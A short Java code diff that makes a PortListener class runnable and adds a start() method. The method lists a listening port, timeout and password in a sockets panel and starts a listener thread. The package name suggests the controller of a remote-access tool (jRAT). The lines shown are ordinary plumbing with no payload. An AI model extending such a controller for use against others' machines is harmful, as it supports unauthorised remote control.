@@ -7,7 +7,7 @@ import java.util.List;
 import se.jrat.client.settings.Sockets;
 import se.jrat.client.ui.panels.PanelMainSockets;
 
-public abstract class PortListener {
+public abstract class PortListener implements Runnable {
 	
 	public static List<PortListener> listeners = new ArrayList<PortListener>();
 	
@@ -64,6 +64,12 @@ public abstract class PortListener {
 	public int getType() {
 		return type;
 	}
+	
+	public void start() {
+		PanelMainSockets.instance.getModel().addRow(new Object[] { "Listening", name, server.getLocalPort(), timeout, pass });
+
+		new Thread(this, "Port " + server.getLocalPort()).start();
+	}
 
 	public static PortListener getListener(String name, int port, int timeout, String pass) {
 		for (int i = 0; i < PortListener.listeners.size(); i++) {
@@ -86,4 +92,5 @@ public abstract class PortListener {
 
 		return null;
 	}
+	
 }
